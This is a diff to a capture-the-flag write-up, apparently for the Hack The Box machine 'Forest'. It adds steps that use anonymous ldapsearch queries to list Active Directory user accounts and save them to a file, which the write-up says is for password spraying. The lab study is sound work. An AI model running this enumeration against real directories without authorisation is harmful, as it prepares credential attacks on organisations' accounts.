@@ -208,7 +208,7 @@ From above info of `Santi Rodriguez`, `whenCreated: 20190920230255.0Z` is import
 All this information is useful when doing password sprays.
 `sAMAccountName` is the username of windows login prompt when we enter username and password to login to windows.
 `ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName`
-Above command 
+Above command will give `sAMAccountName`(All users on AD) only. This users' list is for Password spraying.
 ```bash
 ❯ ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName
 # requesting: sAMAccountName
@@ -243,3 +243,38 @@ sAMAccountName: andy
 sAMAccountName: mark
 sAMAccountName: santi
 ```
+Now Extracting account names only from above list by command `ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'`
+```bash
+requesting:
+Guest
+DefaultAccount
+FOREST$
+EXCH01$
+$331000-VK4ADACQNUCA
+SM_2c8eef0a09b545acb
+SM_ca8c2ed5bdab4dc9b
+SM_75a538d3025e4db9a
+SM_681f53d4942840e18
+SM_1b41c9286325456bb
+SM_9b69f1b9d2cc45549
+SM_7c96b981967141ebb
+SM_c75ee099d0a64c91b
+SM_1ffab36a2f5f479cb
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxc0a90c9
+HealthMailbox670628e
+HealthMailbox968e74d
+HealthMailbox6ded678
+HealthMailbox83d6781
+HealthMailboxfd87238
+HealthMailboxb01ac64
+HealthMailbox7108a4e
+HealthMailbox0659cc1
+sebastien
+lucinda
+andy
+mark
+santi
+```
+Saving above list to file named `userlist.ldap` via command `ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap`
